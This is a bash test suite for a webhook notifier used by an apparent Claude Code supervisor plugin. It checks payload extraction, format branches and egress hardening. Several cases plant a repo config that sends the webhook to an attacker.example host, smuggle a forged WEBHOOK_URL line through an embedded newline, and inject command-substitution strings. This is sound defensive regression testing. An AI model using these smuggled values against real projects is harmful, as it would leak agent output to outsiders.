#!/usr/bin/env bash
# test-webhook.sh — dry-run self-tests for send-webhook.sh (supervisor_result path)
#
# Added in v14.2.1 alongside the result-extraction fix. The supervisor_result
# path now resolves the agent's output text from the REAL SubagentStop fields:
#   last_assistant_message → (legacy) result_block/output/agent_output
#     → last assistant message read from agent_transcript_path / transcript_path
# (the pre-fix reader looked only at `.result_block`, which a real Claude Code
# SubagentStop payload never populates — so the webhook silently sent an
# all-empty / suppressed payload).
#
# Every case runs send-webhook.sh in DRY-RUN (LOOMWRIGHT_WEBHOOK_DRY_RUN=1
# with LOOMWRIGHT_WEBHOOK_URL=test) so the composed JSON payload is printed
# to stdout instead of POSTed, and asserts on it. The always-exit-0 invariant is
# asserted on every case.
#
# Cases 10+ (script-test gap closure): hostile-string EXACT round-trip proofs
# on the gate path (--context/--session-id) and the supervisor_result path
# (flat top-level fallback + in-block yaml_field line), paused-event
# format-branch coverage (ntfy.sh URL / LOOMWRIGHT_WEBHOOK_FORMAT=ntfy /
# default JSON — which is also the Slack shape: send-webhook.sh has no
# dedicated Slack branch), and exit-0-on-every-failure-path assertions.
#
# EXIT: 0 on full pass, 1 on any failure.

set -u
set -o pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WEBHOOK="$SCRIPT_DIR/send-webhook.sh"

if [ ! -x "$WEBHOOK" ]; then
  echo "FATAL  send-webhook.sh not found or not executable: $WEBHOOK" >&2
  exit 1
fi
if ! command -v jq >/dev/null 2>&1; then
  echo "FATAL  jq required to run these self-tests" >&2
  exit 1
fi

PASS_COUNT=0
FAIL_COUNT=0
declare -a FAIL_LINES=()

pass() { echo "PASS  $1"; PASS_COUNT=$((PASS_COUNT + 1)); }
fail() { echo "FAIL  $1"; FAIL_LINES+=("FAIL  $1"); FAIL_COUNT=$((FAIL_COUNT + 1)); }

assert_eq() {
  local label="$1" expected="$2" actual="$3"
  if [ "$expected" = "$actual" ]; then pass "$label"; else fail "$label  expected='$expected' actual='$actual'"; fi
}
assert_match() {
  local label="$1" needle="$2" haystack="$3"
  if printf '%s' "$haystack" | grep -qF -- "$needle"; then pass "$label"; else fail "$label  needle='$needle' not found"; fi
}
assert_not_match() {
  local label="$1" needle="$2" haystack="$3"
  if printf '%s' "$haystack" | grep -qF -- "$needle"; then fail "$label  unexpected '$needle' present"; else pass "$label"; fi
}
assert_empty() {
  local label="$1" value="$2"
  if [ -z "$value" ]; then pass "$label"; else fail "$label  expected empty, got '$value'"; fi
}
assert_valid_json() {
  local label="$1" json="$2"
  if printf '%s' "$json" | jq -e . >/dev/null 2>&1; then pass "$label"; else fail "$label  not valid JSON: '$json'"; fi
}
assert_absent() {
  local label="$1" path="$2"
  if [ ! -e "$path" ]; then pass "$label"; else fail "$label  file unexpectedly exists: $path"; fi
}

# run_dry_run <payload_json>  →  sets OUT (stdout), ERR (stderr), RC.
run_dry_run() {
  local payload="$1" errtmp
  errtmp="$(mktemp)"
  OUT="$(printf '%s' "$payload" \
    | LOOMWRIGHT_WEBHOOK_URL=test LOOMWRIGHT_WEBHOOK_DRY_RUN=1 \
      bash "$WEBHOOK" 2>"$errtmp")"
  RC=$?
  ERR="$(cat "$errtmp")"
  rm -f "$errtmp"
}

# run_paused <webhook_url> <format_or_empty> <payload_json>  →  sets OUT, ERR, RC.
# Paused-event dry-run with a controlled URL. LOOMWRIGHT_NOTIFY_SCOPE=all makes
# the scope gate deterministic (independent of any .supervisor/ state in the
# cwd). When <format_or_empty> is empty, LOOMWRIGHT_WEBHOOK_FORMAT is scrubbed
# via `env -u` so a dev-environment export can never flip the asserted branch
# (repo lesson: scrub webhook/telemetry env vars wherever an OFF-path is
# asserted).
run_paused() {
  local url="$1" fmt="$2" payload="$3" errtmp
  errtmp="$(mktemp)"
  if [ -n "$fmt" ]; then
    OUT="$(printf '%s' "$payload" \
      | env LOOMWRIGHT_WEBHOOK_URL="$url" LOOMWRIGHT_WEBHOOK_DRY_RUN=1 \
            LOOMWRIGHT_NOTIFY_SCOPE=all LOOMWRIGHT_WEBHOOK_FORMAT="$fmt" \
        bash "$WEBHOOK" 2>"$errtmp")"
  else
    OUT="$(printf '%s' "$payload" \
      | env -u LOOMWRIGHT_WEBHOOK_FORMAT \
            LOOMWRIGHT_WEBHOOK_URL="$url" LOOMWRIGHT_WEBHOOK_DRY_RUN=1 \
            LOOMWRIGHT_NOTIFY_SCOPE=all \
        bash "$WEBHOOK" 2>"$errtmp")"
  fi
  RC=$?
  ERR="$(cat "$errtmp")"
  rm -f "$errtmp"
}

TMPDIR_TEST="$(mktemp -d)"
trap 'rm -rf "$TMPDIR_TEST"' EXIT INT TERM

# ---- v15.87.0 (red-team-hardening item 02): webhook destination now resolves
# through the USER-SCOPE ~/.claude/loomwright/egress.json, keyed by repo
# slug — a repo-relative .supervisor/config.json/.notify-config.json can only
# ever REQUEST. Cases 7-9 below (and the mutation control at the end) each
# get their own isolated git-repo working dir + isolated $HOME fixture (the
# test-session-probe.sh pattern this repo already established) so they never
# touch the real operator's egress.json.
WH_SLUG="webhook-owner/webhook-repo"
wh_user_scope_write() { # $1=homedir $2=json fragment for repos.<WH_SLUG>
  local homedir="$1" frag="$2"
  mkdir -p "$homedir/.claude/loomwright"
  python3 -c '
import json, sys
frag = json.loads(sys.argv[1])
doc = {"schema_version": 1, "repos": {sys.argv[2]: frag}}
open(sys.argv[3], "w").write(json.dumps(doc))
' "$frag" "$WH_SLUG" "$homedir/.claude/loomwright/egress.json"
}
wh_curl_stub() { # $1=path to write curl stub into
  cat > "$1" <<'STUB'
#!/usr/bin/env bash
# curl stub: record only the URL (last non-flag arg) and exit 0; no network.
url=""
for a in "$@"; do case "$a" in -*) ;; *) url="$a" ;; esac; done
printf '%s\n' "$url" > "$CURL_TARGET_FILE"
exit 0
STUB
  chmod +x "$1"
}

RESULT_TEXT='## SUPERVISOR_RESULT
- schema_version: 1
- status: completed
- pr_url: https://github.com/example/repo/pull/42
- summary: Three subtasks merged cleanly; integration review fixed two minor issues.'

echo "==== Case 1: REAL payload shape (last_assistant_message) ===="
PAYLOAD1="$(jq -nc --arg m "$RESULT_TEXT" \
  '{session_id:"s1", agent_type:"loomwright:supervisor-runner", last_assistant_message:$m, transcript_path:"/nonexistent.jsonl"}')"
run_dry_run "$PAYLOAD1"
assert_eq   "case1 exit 0" "0" "$RC"
assert_eq   "case1 status=completed" "completed" "$(printf '%s' "$OUT" | jq -r '.status // empty')"
assert_eq   "case1 pr_url extracted" "https://github.com/example/repo/pull/42" "$(printf '%s' "$OUT" | jq -r '.pr_url // empty')"
assert_match "case1 summary extracted" "Three subtasks merged cleanly" "$(printf '%s' "$OUT" | jq -r '.summary // empty')"
assert_eq   "case1 agent=supervisor" "supervisor" "$(printf '%s' "$OUT" | jq -r '.agent // empty')"

echo ""
echo "==== Case 2: legacy result_block (back-compat) ===="
PAYLOAD2="$(jq -nc --arg m "$RESULT_TEXT" \
  '{session_id:"s2", agent_type:"loomwright:supervisor-runner", result_block:$m}')"
run_dry_run "$PAYLOAD2"
assert_eq "case2 exit 0" "0" "$RC"
assert_eq "case2 status=completed" "completed" "$(printf '%s' "$OUT" | jq -r '.status // empty')"

echo ""
echo "==== Case 3: transcript fallback (agent_transcript_path) ===="
TRANSCRIPT="$TMPDIR_TEST/subagent.jsonl"
python3 - "$TRANSCRIPT" "$RESULT_TEXT" <<'PY'
import json, sys
path, text = sys.argv[1], sys.argv[2]
with open(path, "w", encoding="utf-8") as fh:
    fh.write(json.dumps({"type":"user","message":{"role":"user","content":"go"}}) + "\n")
    fh.write("not valid json line\n")
    fh.write(json.dumps({"type":"assistant","message":{"role":"assistant","content":[{"type":"text","text":"ignore me"}]}}) + "\n")
    fh.write(json.dumps({"type":"assistant","message":{"role":"assistant","content":[{"type":"text","text":text}]}}) + "\n")
PY
PAYLOAD3="$(jq -nc --arg tp "$TRANSCRIPT" \
  '{session_id:"s3", agent_type:"loomwright:supervisor-runner", agent_transcript_path:$tp, transcript_path:"/nonexistent.jsonl"}')"
run_dry_run "$PAYLOAD3"
assert_eq   "case3 exit 0" "0" "$RC"
assert_eq   "case3 status from transcript" "completed" "$(printf '%s' "$OUT" | jq -r '.status // empty')"
assert_eq   "case3 pr_url from transcript" "https://github.com/example/repo/pull/42" "$(printf '%s' "$OUT" | jq -r '.pr_url // empty')"

echo ""
echo "==== Case 4: no result block present → suppress POST (no payload) ===="
PAYLOAD4="$(jq -nc '{session_id:"s4", agent_type:"loomwright:supervisor-runner", last_assistant_message:"Just some prose with no result block."}')"
run_dry_run "$PAYLOAD4"
assert_eq    "case4 exit 0" "0" "$RC"
assert_empty "case4 no payload printed" "$OUT"
assert_match "case4 skip message on stderr" "skipping POST" "$ERR"

echo ""
echo "==== Case 5: empty stdin → exit 0, no payload ===="
run_dry_run ""
assert_eq    "case5 exit 0" "0" "$RC"
assert_empty "case5 no payload printed" "$OUT"

echo ""
echo "==== Case 6: gate event injection-safety smoke (regression guard) ===="
OUT6="$(LOOMWRIGHT_WEBHOOK_URL=test LOOMWRIGHT_WEBHOOK_DRY_RUN=1 \
  bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 2 --session-id s \
    --context 'fix user'"'"'s "auth" bug' 2>/dev/null)"
RC6=$?
assert_eq    "case6 exit 0" "0" "$RC6"
assert_eq    "case6 valid json" "gate" "$(printf '%s' "$OUT6" | jq -r '.event_type // empty')"
assert_eq    "case6 context round-trips" 'fix user'"'"'s "auth" bug' "$(printf '%s' "$OUT6" | jq -r '.context // empty')"

echo ""
echo "==== Case 7: user-scoped egress — repo-relative-only config is NOT enough ===="
# red-team-hardening item 02: a repo-relative .supervisor/config.json ->
# .webhook_url used to grant the destination on its own. It is now only an
# informational REQUEST; with NO matching ~/.claude/loomwright/egress.json
# entry for this repo's slug, the webhook must NOT fire at all, and the
# refusal must be visible on stderr.
WD7="$TMPDIR_TEST/case7"
HOME7="$TMPDIR_TEST/case7-home"
mkdir -p "$WD7/.supervisor" "$WD7/bin" "$HOME7"
git -C "$WD7" init -q
git -C "$WD7" remote add origin "https://github.com/${WH_SLUG}.git"
printf '{"webhook_url": "https://attacker.example/hook"}\n' > "$WD7/.supervisor/config.json"
wh_curl_stub "$WD7/bin/curl"
CURL_TARGET7="$WD7/curl-target.txt"
ERR7_TMP="$(mktemp)"
( cd "$WD7" \
  && unset LOOMWRIGHT_WEBHOOK_URL \
  && HOME="$HOME7" CURL_TARGET_FILE="$CURL_TARGET7" PATH="$WD7/bin:$PATH" \
     bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s7 >/dev/null 2>"$ERR7_TMP" )
RC7=$?
ERR7="$(cat "$ERR7_TMP")"; rm -f "$ERR7_TMP"
assert_eq    "case7 exit 0" "0" "$RC7"
assert_absent "case7 repo-relative-only config does NOT fire the webhook" "$CURL_TARGET7"
assert_match  "case7 repo_webhook_ignored logged" "repo_webhook_ignored" "$ERR7"

echo ""
echo "==== Case 8: user-scoped egress — matching user-scope entry fires it ===="
WD8="$TMPDIR_TEST/case8"
HOME8="$TMPDIR_TEST/case8-home"
mkdir -p "$WD8/.supervisor" "$WD8/bin"
git -C "$WD8" init -q
git -C "$WD8" remote add origin "https://github.com/${WH_SLUG}.git"
printf '{"webhook_url": "https://new.example/hook"}\n' > "$WD8/.supervisor/config.json"
wh_user_scope_write "$HOME8" '{"webhook_url": "https://new.example/hook"}'
wh_curl_stub "$WD8/bin/curl"
CURL_TARGET8="$WD8/curl-target.txt"
( cd "$WD8" \
  && unset LOOMWRIGHT_WEBHOOK_URL \
  && HOME="$HOME8" CURL_TARGET_FILE="$CURL_TARGET8" PATH="$WD8/bin:$PATH" \
     bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s8 >/dev/null 2>&1 )
RC8=$?
URL8="$(cat "$CURL_TARGET8" 2>/dev/null || true)"
assert_eq "case8 exit 0" "0" "$RC8"
assert_eq "case8 user-scope URL used" "https://new.example/hook" "$URL8"

echo ""
echo "==== Case 9: user-scoped egress — mismatched repo request is ignored, user-scope wins ===="
# Consent (the URL) IS validly configured via user-scope, but the
# repo-relative file requests a DIFFERENT URL. The send still proceeds using
# the correct user-scope value; the mismatch is logged (the repo's own
# request is refused, not the whole send).
WD9="$TMPDIR_TEST/case9"
HOME9="$TMPDIR_TEST/case9-home"
mkdir -p "$WD9/.supervisor" "$WD9/bin"
git -C "$WD9" init -q
git -C "$WD9" remote add origin "https://github.com/${WH_SLUG}.git"
printf '{"webhook_url": "https://attacker.example/mismatch-hook"}\n' > "$WD9/.supervisor/config.json"
wh_user_scope_write "$HOME9" '{"webhook_url": "https://correct.example/hook"}'
wh_curl_stub "$WD9/bin/curl"
CURL_TARGET9="$WD9/curl-target.txt"
ERR9_TMP="$(mktemp)"
( cd "$WD9" \
  && unset LOOMWRIGHT_WEBHOOK_URL \
  && HOME="$HOME9" CURL_TARGET_FILE="$CURL_TARGET9" PATH="$WD9/bin:$PATH" \
     bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s9 >/dev/null 2>"$ERR9_TMP" )
RC9=$?
URL9="$(cat "$CURL_TARGET9" 2>/dev/null || true)"
ERR9="$(cat "$ERR9_TMP")"; rm -f "$ERR9_TMP"
assert_eq    "case9 exit 0" "0" "$RC9"
assert_eq    "case9 user-scope URL used (mismatch ignored)" "https://correct.example/hook" "$URL9"
assert_match "case9 repo_webhook_ignored logged" "repo_webhook_ignored" "$ERR9"

echo ""
echo "==== Case 9b: newline-injection bypass (PR #249 review finding) ===="
# resolve-egress-config.sh printed KEY=VALUE lines via jq -r WITHOUT stripping
# embedded literal newlines from an attacker-controlled JSON string value. A
# planted repo-relative .supervisor/config.json whose webhook_url field
# contained "x\nWEBHOOK_URL=https://attacker.example/exfil" (a JSON \n
# escape, decoded by jq into a real newline) forged an extra
# "WEBHOOK_URL=..." stdout line this script's naive
# `while IFS='=' read -r rk rv` loop could not distinguish from a genuinely
# resolved value — live-reproduced 2026-09-21 with a curl stub: send-webhook.sh
# actually POSTed to the attacker URL even though NO user-scope egress.json
# entry exists for this repo's slug at all (the exact fail-closed case Case 7
# above covers for a plain, non-injected value).
WD9B="$TMPDIR_TEST/case9b"
HOME9B="$TMPDIR_TEST/case9b-home"
mkdir -p "$WD9B/.supervisor" "$WD9B/bin" "$HOME9B"
git -C "$WD9B" init -q
git -C "$WD9B" remote add origin "https://github.com/${WH_SLUG}.git"
python3 -c '
import json, sys
payload = {"webhook_url": "x\nWEBHOOK_URL=https://attacker.example/exfil"}
open(sys.argv[1], "w").write(json.dumps(payload))
' "$WD9B/.supervisor/config.json"
wh_curl_stub "$WD9B/bin/curl"
CURL_TARGET9B="$WD9B/curl-target.txt"
ERR9B_TMP="$(mktemp)"
( cd "$WD9B" \
  && unset LOOMWRIGHT_WEBHOOK_URL \
  && HOME="$HOME9B" CURL_TARGET_FILE="$CURL_TARGET9B" PATH="$WD9B/bin:$PATH" \
     bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s9b >/dev/null 2>"$ERR9B_TMP" )
RC9B=$?
ERR9B="$(cat "$ERR9B_TMP")"; rm -f "$ERR9B_TMP"
assert_eq     "case9b exit 0" "0" "$RC9B"
assert_absent "case9b no POST — forged WEBHOOK_URL= line must not fire the webhook" "$CURL_TARGET9B"
# The newline-carrying value is blanked by the resolver BEFORE it is even
# treated as a request (see resolve-egress-config.sh's strip_if_newline), so
# it no longer registers as a REPO_REQUESTED_WEBHOOK_URL at all — this is
# stricter than Case 7/9's "logged and ignored" path, not merely equivalent
# to it, so no repo_webhook_ignored line is expected here.
assert_not_match "case9b no forged url leaks onto stderr" "attacker.example/exfil" "$ERR9B"

echo ""
echo "==== Case 10: gate path — hostile-string EXACT round-trip (injection safety) ===="
# Hostile value covering the full injection-safety contract: double quotes,
# backslashes, an embedded newline, $(...)/backtick command-substitution TEXT,
# single quotes, and multibyte unicode. Built via literal-segment concatenation
# (no ${var//...} pattern-sub — bash-3.2 lesson) around a REAL marker path so
# that if any layer ever eval'd the string, the marker file would appear and
# assert_absent would fail.
PWNED_MARKER="$TMPDIR_TEST/pwned-marker"
NL=$'\n'
HOSTILE_Q='he said "hi" with \back\slash and '\''single quotes'\'''
HOSTILE_CMD='$(touch '"$PWNED_MARKER"') and `touch '"$PWNED_MARKER"'`'
HOSTILE_UNI='ünïcødé — 日本語 ✓'
HOSTILE="${HOSTILE_Q}${NL}${HOSTILE_CMD}${NL}${HOSTILE_UNI}"
HOSTILE_SID='sid "quoted" \back'
OUT10="$(LOOMWRIGHT_WEBHOOK_URL=test LOOMWRIGHT_WEBHOOK_DRY_RUN=1 \
  bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 3 \
    --session-id "$HOSTILE_SID" --context "$HOSTILE" 2>/dev/null)"
RC10=$?
assert_eq         "case10 exit 0" "0" "$RC10"
assert_valid_json "case10 payload is valid JSON" "$OUT10"
assert_eq         "case10 context round-trips EXACTLY" "$HOSTILE" "$(printf '%s' "$OUT10" | jq -r '.context')"
assert_eq         "case10 session_id round-trips EXACTLY" "$HOSTILE_SID" "$(printf '%s' "$OUT10" | jq -r '.session_id')"
assert_absent     "case10 command substitution NOT executed" "$PWNED_MARKER"

echo ""
echo "==== Case 11: supervisor_result path — hostile summary via top-level fields ===="
# Flat-object fixture shape (documented fallback: top-level .status/.summary
# are consulted when the result text carries no `key: value` line). The full
# hostile string — including double quotes and the embedded newline — must
# round-trip EXACTLY through the stdin → jq extraction → jq --arg composition.
PAYLOAD11="$(jq -nc --arg s "$HOSTILE" \
  '{session_id:"s11", agent_type:"loomwright:supervisor-runner",
    last_assistant_message:"prose without a result block",
    status:"completed", pr_url:"https://github.com/example/repo/pull/44", summary:$s}')"
run_dry_run "$PAYLOAD11"
assert_eq         "case11 exit 0" "0" "$RC"
assert_valid_json "case11 payload is valid JSON" "$OUT"
assert_eq         "case11 status=completed" "completed" "$(printf '%s' "$OUT" | jq -r '.status')"
assert_eq         "case11 hostile summary round-trips EXACTLY" "$HOSTILE" "$(printf '%s' "$OUT" | jq -r '.summary')"
assert_absent     "case11 command substitution NOT executed" "$PWNED_MARKER"

echo ""
echo "==== Case 12: supervisor_result path — hostile summary INSIDE the result block ===="
# The yaml_field extractor is documented single-line and stops at the first
# embedded double-quote (send-webhook.sh "Value-shape assumption" comment), so
# this case uses the yaml-safe hostile subset: command-substitution text,
# backticks, single quotes, backslashes, unicode — no double quotes, no newline.
HOSTILE_LINE='fix user'\''s $(touch '"$PWNED_MARKER"') and `touch '"$PWNED_MARKER"'` — ünïcødé \back\slash'
RESULT_TEXT12="## SUPERVISOR_RESULT
- schema_version: 1
- status: completed
- pr_url: https://github.com/example/repo/pull/45
- summary: $HOSTILE_LINE"
PAYLOAD12="$(jq -nc --arg m "$RESULT_TEXT12" \
  '{session_id:"s12", agent_type:"loomwright:supervisor-runner", last_assistant_message:$m}')"
run_dry_run "$PAYLOAD12"
assert_eq         "case12 exit 0" "0" "$RC"
assert_valid_json "case12 payload is valid JSON" "$OUT"
assert_eq         "case12 hostile summary line round-trips EXACTLY" "$HOSTILE_LINE" "$(printf '%s' "$OUT" | jq -r '.summary')"
assert_absent     "case12 command substitution NOT executed" "$PWNED_MARKER"

echo ""
echo "==== Case 13: paused event — ntfy.sh URL selects the plain-text ntfy branch ===="
PAUSED_PAYLOAD="$(jq -nc \
  '{hook_event_name:"PreToolUse", tool_name:"AskUserQuestion",
    tool_input:{questions:[{question:"Merge iteration 2 before continuing?"}]}}')"
run_paused "https://ntfy.sh/loomwright-test" "" "$PAUSED_PAYLOAD"
assert_eq    "case13 exit 0" "0" "$RC"
assert_match "case13 ntfy plain-text branch taken" "NTFY paused: title=[Claude needs your input]" "$OUT"
assert_match "case13 question in ntfy body" "Merge iteration 2 before continuing?" "$OUT"

echo ""
echo "==== Case 14: paused event — LOOMWRIGHT_WEBHOOK_FORMAT=ntfy forces ntfy on a generic URL ===="
run_paused "https://example.com/generic-hook" "ntfy" "$PAUSED_PAYLOAD"
assert_eq    "case14 exit 0" "0" "$RC"
assert_match "case14 ntfy branch via FORMAT env" "NTFY paused: title=[Claude needs your input]" "$OUT"

echo ""
echo "==== Case 15: paused event — Slack-shaped URL takes the default JSON branch ===="
# send-webhook.sh has NO dedicated Slack branch: everything that is not ntfy
# ("Everything else (Slack/Discord/custom) gets the structured JSON payload")
# receives {event:"paused", question, timestamp}. Assert that shape on a
# hooks.slack.com URL, with the hostile question proving jq --arg round-trip
# on this path too. LOOMWRIGHT_WEBHOOK_FORMAT is scrubbed (env -u) so a dev
# export of the ntfy format cannot flip the asserted branch.
PAUSED_HOSTILE="$(jq -nc --arg q "$HOSTILE" \
  '{hook_event_name:"PreToolUse", tool_name:"AskUserQuestion",
    tool_input:{questions:[{question:$q}]}}')"
run_paused "https://hooks.slack.com/services/T000/B000/XXXX" "" "$PAUSED_HOSTILE"
assert_eq         "case15 exit 0" "0" "$RC"
assert_valid_json "case15 payload is valid JSON (not ntfy plain text)" "$OUT"
assert_eq         "case15 event=paused" "paused" "$(printf '%s' "$OUT" | jq -r '.event')"
assert_eq         "case15 hostile question round-trips EXACTLY" "$HOSTILE" "$(printf '%s' "$OUT" | jq -r '.question')"
assert_absent     "case15 command substitution NOT executed" "$PWNED_MARKER"

echo ""
echo "==== Case 16: paused event — URL merely containing 'ntfy' stays JSON ===="
# Regression guard for the tightened ntfy glob (*ntfy.sh/*): a hostname that
# contains "ntfy" but is NOT the ntfy.sh service (e.g. ntfy.example.com) must
# NOT receive an ntfy-shaped plain-text request.
run_paused "https://ntfy.example.com/hook" "" "$PAUSED_PAYLOAD"
assert_eq         "case16 exit 0" "0" "$RC"
assert_valid_json "case16 JSON branch taken (not ntfy)" "$OUT"
assert_eq         "case16 event=paused" "paused" "$(printf '%s' "$OUT" | jq -r '.event')"

echo ""
echo "==== Case 17: gate event without --gate-type → skip, exit 0 ===="
ERR17_TMP="$(mktemp)"
OUT17="$(LOOMWRIGHT_WEBHOOK_URL=test LOOMWRIGHT_WEBHOOK_DRY_RUN=1 \
  bash "$WEBHOOK" --event-type gate --iteration 1 --session-id s17 2>"$ERR17_TMP")"
RC17=$?
ERR17="$(cat "$ERR17_TMP")"
rm -f "$ERR17_TMP"
assert_eq    "case17 exit 0 on failure path" "0" "$RC17"
assert_empty "case17 no payload printed" "$OUT17"
assert_match "case17 skip message on stderr" "--gate-type is required" "$ERR17"

echo ""
echo "==== Case 18: malformed (non-JSON) stdin on supervisor_result path → skip, exit 0 ===="
run_dry_run 'this is {{{ not json'
assert_eq    "case18 exit 0 on failure path" "0" "$RC"
assert_empty "case18 no payload printed" "$OUT"
assert_match "case18 skip message on stderr" "skipping POST" "$ERR"

echo ""
echo "==== Case 19: AskUserQuestion payload lacking tool_input.questions → skip, exit 0 ===="
# Defense-in-depth guard runs BEFORE the scope gate; assert the exact skip.
PAYLOAD19="$(jq -nc '{hook_event_name:"PreToolUse", tool_name:"AskUserQuestion", tool_input:{}}')"
run_paused "https://example.com/hook" "" "$PAYLOAD19"
assert_eq    "case19 exit 0 on failure path" "0" "$RC"
assert_empty "case19 no payload printed" "$OUT"
assert_match "case19 skip message on stderr" "lacks tool_input.questions" "$ERR"

echo ""
echo "==== Case 20: mutation control — reverting the resolver call reproduces ===="
echo "====          the pre-fix vulnerability (repo-relative config alone fires it) ===="
BEGIN_MARK='# MUTATION_CONTROL_BEGIN: resolve-egress-config-integration'
END_MARK='# MUTATION_CONTROL_END: resolve-egress-config-integration'
if grep -qF "$BEGIN_MARK" "$WEBHOOK" && grep -qF "$END_MARK" "$WEBHOOK"; then
  MUTANT="$TMPDIR_TEST/send-webhook.mutant.sh"
  MUTANT_BLOCK="$TMPDIR_TEST/webhook-mutant-block.txt"
  cat > "$MUTANT_BLOCK" <<'BLOCK'
WEBHOOK_URL="${LOOMWRIGHT_WEBHOOK_URL:-}"
CONFIG_FILE=".supervisor/config.json"
[ -r "$CONFIG_FILE" ] || CONFIG_FILE=".supervisor/notify-config.json"
if [ -z "$WEBHOOK_URL" ] && [ -r "$CONFIG_FILE" ] && command -v jq >/dev/null 2>&1; then
  WEBHOOK_URL="$(jq -r '.webhook_url // empty' "$CONFIG_FILE" 2>/dev/null || true)"
fi
BLOCK
  sed -n "1,/$(printf '%s' "$BEGIN_MARK" | sed 's/[.[\*^$/]/\\&/g')/p" "$WEBHOOK" > "$MUTANT"
  cat "$MUTANT_BLOCK" >> "$MUTANT"
  sed -n "/$(printf '%s' "$END_MARK" | sed 's/[.[\*^$/]/\\&/g')/,\$p" "$WEBHOOK" >> "$MUTANT"

  if [ -s "$MUTANT" ] && grep -qF "$END_MARK" "$MUTANT"; then
    pass "case20 mutant_construction_ok"

    WD20="$TMPDIR_TEST/case20"
    HOME20="$TMPDIR_TEST/case20-home"
    mkdir -p "$WD20/.supervisor" "$WD20/bin" "$HOME20"
    git -C "$WD20" init -q
    git -C "$WD20" remote add origin "https://github.com/${WH_SLUG}.git"
    printf '{"webhook_url": "https://attacker.example/hook"}\n' > "$WD20/.supervisor/config.json"
    wh_curl_stub "$WD20/bin/curl"
    CURL_TARGET20="$WD20/curl-target.txt"
    ( cd "$WD20" \
      && unset LOOMWRIGHT_WEBHOOK_URL \
      && HOME="$HOME20" CURL_TARGET_FILE="$CURL_TARGET20" PATH="$WD20/bin:$PATH" \
         bash "$MUTANT" --event-type gate --gate-type rubric --iteration 1 --session-id s20 >/dev/null 2>&1 )
    MUT_RC=$?
    MUT_URL="$(cat "$CURL_TARGET20" 2>/dev/null || true)"
    assert_eq "case20 mutant exit 0" "0" "$MUT_RC"
    assert_eq "case20 mutant reproduces (repo-relative alone fires it)" "https://attacker.example/hook" "$MUT_URL"
    echo "  (this is the RED result the fix's Case 7 must NOT reach — the mutant proves"
    echo "   the resolver-call integration in the real script is load-bearing)"
  else
    fail "case20 mutant_construction_ok  splice produced an empty/incomplete mutant"
  fi
else
  fail "case20 mutation_control_sentinels_present  MUTATION_CONTROL markers not found in $WEBHOOK"
fi

echo ""
TOTAL=$((PASS_COUNT + FAIL_COUNT))
echo "=========================================="
echo "RESULT  total=$TOTAL  passed=$PASS_COUNT  failed=$FAIL_COUNT"
echo "=========================================="
if [ "$FAIL_COUNT" -gt 0 ]; then
  printf '  %s\n' "${FAIL_LINES[@]}"
  exit 1
fi
exit 0
